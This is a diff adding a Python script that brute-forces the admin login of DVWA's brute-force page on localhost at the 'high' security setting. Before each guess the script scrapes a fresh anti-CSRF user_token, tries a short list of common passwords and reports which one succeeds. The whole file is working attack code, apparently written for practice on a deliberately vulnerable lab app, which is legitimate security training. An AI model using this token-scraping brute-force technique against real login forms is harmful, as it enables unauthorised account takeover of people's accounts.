@@ -1,0 +1,29 @@
+import requests
+import re
+
+url = "http://localhost:8080/vulnerabilities/brute/"
+cookies = {
+    "PHPSESSID": "2q4c3rafk9cirs4dkl6o4sr792",
+    "security": "high"
+}
+
+passwords = ["password", "admin", "123456", "letmein", "abc123"]
+
+for password in passwords:
+  
+    r = requests.get(url, cookies=cookies)
+    token = re.search(r"user_token.*?value='(.*?)'", r.text).group(1)
+   
+    params = {
+        "username": "admin",
+        "password": password,
+        "Login": "Login",
+        "user_token": token
+    }
+    r = requests.get(url, params=params, cookies=cookies)
+    
+    if "Welcome to the password protected area" in r.text:
+        print(f"[+] Password found: {password}")
+        break
+    else:
+        print(f"[-] Failed: {password}")
